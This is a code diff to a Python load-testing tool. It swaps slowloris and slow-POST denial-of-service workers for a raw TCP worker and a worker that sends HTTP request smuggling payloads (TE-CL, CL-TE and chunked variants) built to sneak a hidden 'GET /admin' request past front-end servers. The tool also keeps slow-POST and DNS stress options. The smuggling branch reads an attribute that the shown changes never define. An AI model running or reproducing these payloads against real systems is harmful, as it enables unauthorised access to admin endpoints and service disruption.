@@ -59,6 +59,7 @@ class LoadTester:
         slow_post=False,
         dns_stress=False,
         ipv6=False,
+        http_version=None,
     ):
         if config:
             with open(config, "r") as f:
@@ -89,6 +90,7 @@ class LoadTester:
                 slow_post = cfg.get("slow_post", slow_post)
                 dns_stress = cfg.get("dns_stress", dns_stress)
                 ipv6 = cfg.get("ipv6", ipv6)
+                http_version = cfg.get("http_version", http_version)
                 rps = cfg.get("rps", rps)
                 client_cert = cfg.get("client_cert", client_cert)
                 client_key = cfg.get("client_key", client_key)
@@ -132,6 +134,7 @@ class LoadTester:
         self.slow_post = slow_post
         self.dns_stress = dns_stress
         self.ipv6 = ipv6
+        self.http_version = http_version
         self.results = {"success": 0, "failed": 0, "response_times": [], "errors": {}}
         self.lock = threading.Lock()
         self.running = True
@@ -173,41 +176,41 @@ class LoadTester:
                         self.results["errors"].get(str(type(e).__name__), 0) + 1
                     )
 
-    def slowloris_worker(self):
+    def raw_tcp_worker(self):
         try:
             parsed = httpx.URL(self.url)
             host = parsed.host
             port = parsed.port or 80
             path = parsed.path or "/"
         except:
-            return
+            host, port = (
+                self.url.split(":")[0],
+                int(self.url.split(":")[1]) if ":" in self.url else 80,
+            )
+            path = "/"
 
         while self.running:
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(10)
+                family = socket.AF_INET6 if self.ipv6 else socket.AF_INET
+                sock = socket.socket(family, socket.SOCK_STREAM)
+                sock.settimeout(5)
                 sock.connect((host, port))
 
-                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+                ver = f"HTTP/{self.http_version}" if self.http_version else "HTTP/1.1"
+                req = f"GET {path} {ver}\r\nHost: {host}\r\n\r\n"
                 sock.send(req.encode())
-
-                for _ in range(150):
-                    if not self.running:
-                        break
-                    time.sleep(15)
-                    try:
-                        sock.send(b"X-a: b\r\n")
-                    except:
-                        break
-
+                sock.recv(1024)
                 sock.close()
                 with self.lock:
                     self.results["success"] += 1
             except Exception as e:
                 with self.lock:
                     self.results["failed"] += 1
+                    self.results["errors"][str(type(e).__name__)] = (
+                        self.results["errors"].get(str(type(e).__name__), 0) + 1
+                    )
 
-    def slow_post_worker(self):
+    def smuggling_worker(self):
         try:
             parsed = httpx.URL(self.url)
             host = parsed.host
@@ -222,25 +225,45 @@ class LoadTester:
                 sock.settimeout(10)
                 sock.connect((host, port))
 
-                req = (
-                    f"POST {path} HTTP/1.1\r\n"
-                    f"Host: {host}\r\n"
-                    f"Content-Length: 1000\r\n\r\n"
-                )
+                if self.http_smuggling == "te-cl":
+                    req = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {host}\r\n"
+                        f"Transfer-Encoding: chunked\r\n"
+                        f"Content-Length: 10\r\n"
+                        f"\r\n"
+                        f"0\r\n\r\n"
+                        f"GET /admin HTTP/1.1\r\n"
+                        f"Host: {host}\r\n\r\n"
+                    )
+                elif self.http_smuggling == "cl-te":
+                    req = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {host}\r\n"
+                        f"Content-Length: 3\r\n"
+                        f"Transfer-Encoding: chunked\r\n"
+                        f"\r\n"
+                        f"GET /admin HTTP/1.1\r\n"
+                        f"Host: {host}\r\n\r\n"
+                    )
+                elif self.http_smuggling == "te-content":
+                    req = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {host}\r\n"
+                        f"Transfer-Encoding: chunked\r\n"
+                        f"\r\n"
+                        f"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
+                    )
+                else:
+                    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
+
                 sock.send(req.encode())
-
-                for _ in range(100):
-                    if not self.running:
-                        break
-                    time.sleep(3)
-                    try:
-                        sock.send(b"x=1&")
-                    except:
-                        break
-
+                resp = sock.recv(4096)
                 sock.close()
+
                 with self.lock:
                     self.results["success"] += 1
+
             except Exception as e:
                 with self.lock:
                     self.results["failed"] += 1
@@ -764,6 +787,8 @@ class LoadTester:
             print(f"    DNS Stress: enabled")
         if self.ipv6:
             print(f"    IPv6: enabled")
+        if self.http_version:
+            print(f"    HTTP Version: {self.http_version}")
 
         start_time = time.time()
 
@@ -1197,6 +1222,11 @@ def main():
         action="store_true",
         help="Use IPv6 for connections",
     )
+    parser.add_argument(
+        "--http-version",
+        choices=["1.0", "1.1", "0.9"],
+        help="Custom HTTP version (1.0, 1.1, 0.9)",
+    )
 
     args = parser.parse_args()
 
@@ -1242,6 +1272,7 @@ def main():
         slow_post=args.slow_post,
         dns_stress=args.dns_stress,
         ipv6=args.ipv6,
+        http_version=args.http_version,
     )
     tester.run()
 
